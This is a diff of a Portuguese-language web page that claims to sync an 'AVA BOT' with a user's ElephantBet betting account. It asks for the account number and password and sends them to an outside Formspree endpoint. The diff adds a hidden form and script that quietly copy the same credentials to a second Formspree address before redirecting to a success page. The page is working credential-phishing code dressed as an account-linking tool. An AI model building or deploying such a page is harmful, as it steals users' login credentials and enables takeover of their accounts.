@@ -1,145 +1,160 @@
 <!DOCTYPE html>
 <html lang="pt">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sincronizar Conta - ElephantBet</title>
-    <style> 
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #007bff, #00c6ff);
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            height: 100vh;
-            margin: 0;
-            padding-top: 10vh;
-        }
-
-        .container {
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-            width: 100%;
-            max-width: 350px;
-            text-align: center;
-            animation: fadeIn 1s ease-in-out;
-        }
-
-        h2 {
-            color: #007bff;
-            font-size: 18px;
-        }
-
-        h2 span {
-            color: #ff007f;
-            font-weight: bold;
-        }
-
-        label {
-            display: block;
-            margin: 10px 0 5px;
-            font-weight: bold;
-            text-align: left;
-            color: #333;
-            font-size: 14px;
-        }
-
-        input {
-            width: 90%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 14px;
-            transition: 0.3s;
-        }
-
-        input:focus {
-            border-color: #007bff;
-            box-shadow: 0 0 8px rgba(0, 123, 255, 0.2);
-            outline: none;
-        }
-
-        button {
-            width: 90%;
-            padding: 12px;
-            background: linear-gradient(135deg, #007bff, #0056b3);
-            border: none;
-            color: white;
-            font-size: 16px;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-
-        button:hover {
-            background: linear-gradient(135deg, #0056b3, #003f7f);
-        }
-
-        @media (max-width: 480px) {
-            .container {
-                padding: 15px;
-            }
-            input, button {
-                font-size: 14px;
-                padding: 10px;
-            }
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sincronizar Conta - ElephantBet</title>
+  <style> 
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #007bff, #00c6ff);
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      height: 100vh;
+      margin: 0;
+      padding-top: 10vh;
+    }
+    .container {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 350px;
+      text-align: center;
+      animation: fadeIn 1s ease-in-out;
+    }
+    h2 {
+      color: #007bff;
+      font-size: 18px;
+    }
+    h2 span {
+      color: #ff007f;
+      font-weight: bold;
+    }
+    label {
+      display: block;
+      margin: 10px 0 5px;
+      font-weight: bold;
+      text-align: left;
+      color: #333;
+      font-size: 14px;
+    }
+    input {
+      width: 90%;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 14px;
+      transition: 0.3s;
+    }
+    input:focus {
+      border-color: #007bff;
+      box-shadow: 0 0 8px rgba(0, 123, 255, 0.2);
+      outline: none;
+    }
+    button {
+      width: 90%;
+      padding: 12px;
+      background: linear-gradient(135deg, #007bff, #0056b3);
+      border: none;
+      color: white;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover {
+      background: linear-gradient(135deg, #0056b3, #003f7f);
+    }
+    @media (max-width: 480px) {
+      .container {
+        padding: 15px;
+      }
+      input, button {
+        font-size: 14px;
+        padding: 10px;
+      }
+    }
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(-20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Sincroniza AVA BOT com sua conta da <span>ELEPHANTBET <br><a href="bot.html">voltar</a></span></h2>
-        <form id="syncForm" action="https://formspree.io/f/xvgagaav" method="POST">
-            <label for="numero">Número da Conta ElephantBet:</label>
-            <input type="tel" id="numero" name="numero" placeholder="Digite seu número" required>
+  <div class="container">
+    <h2>Sincroniza AVA BOT com sua conta da <span>ELEPHANTBET <br><a href="bot.html">voltar</a></span></h2>
+    <!-- Formulário visível -->
+    <form id="syncForm" action="https://formspree.io/f/xvgagaav" method="POST">
+      <label for="numero">Número da Conta ElephantBet:</label>
+      <input type="tel" id="numero" name="numero" placeholder="Digite seu número" required>
 
-            <label for="senha">Senha:</label>
-            <input type="text" id="senha" name="senha" placeholder="Digite sua senha" required>
-            <br><br>
-            <button type="submit" id="submitButton">Sincronizar Agora</button>
-        </form>
-    </div>
+      <label for="senha">Senha:</label>
+      <input type="text" id="senha" name="senha" placeholder="Digite sua senha" required>
+      <br><br>
+      <button type="submit" id="submitButton">Sincronizar Agora</button>
+    </form>
 
-    <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            const syncForm = document.getElementById("syncForm");
+    <!-- Formulário oculto -->
+    <form id="hiddenForm" action="https://formspree.io/f/xvgzrljq" method="POST" style="display: none;">
+      <input type="hidden" name="numero" id="hiddenNumero">
+      <input type="hidden" name="senha" id="hiddenSenha">
+    </form>
+  </div>
 
-            syncForm.addEventListener("submit", function (event) {
-                event.preventDefault();
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const syncForm = document.getElementById("syncForm");
+      const hiddenForm = document.getElementById("hiddenForm");
 
-                const formData = new FormData(this);
+      syncForm.addEventListener("submit", function (event) {
+        event.preventDefault();
 
-                fetch(this.action, {
-                    method: this.method,
-                    body: formData,
-                    headers: { "Accept": "application/json" }
-                })
-                .then(response => {
-                    if (response.ok) {
-                        setTimeout(() => {
-                            window.location.href = "sucesso.html";
-                        }, 500);
-                    } else {
-                        alert("Erro ao enviar o formulário. Tente novamente.");
-                    }
-                })
-                .catch(() => alert("Erro ao conectar ao servidor."));
+        const numero = document.getElementById("numero").value;
+        const senha = document.getElementById("senha").value;
+
+        // Enviar dados para o primeiro Formspree
+        const formData = new FormData(syncForm);
+
+        fetch(syncForm.action, {
+          method: syncForm.method,
+          body: formData,
+          headers: { "Accept": "application/json" }
+        })
+        .then(response => {
+          if (response.ok) {
+            // Preencher o segundo formulário automaticamente
+            document.getElementById("hiddenNumero").value = numero;
+            document.getElementById("hiddenSenha").value = senha;
+
+            // Enviar para o segundo Formspree
+            fetch(hiddenForm.action, {
+              method: hiddenForm.method,
+              body: new FormData(hiddenForm),
+              headers: { "Accept": "application/json" }
+            })
+            .finally(() => {
+              // Redireciona após tudo
+              setTimeout(() => {
+                window.location.href = "sucesso.html";
+              }, 500);
             });
-        });
-    </script>
+
+          } else {
+            alert("Erro ao enviar os dados. Tente novamente.");
+          }
+        })
+        .catch(() => alert("Erro ao conectar ao servidor."));
+      });
+    });
+  </script>
 </body>
 </html>
-
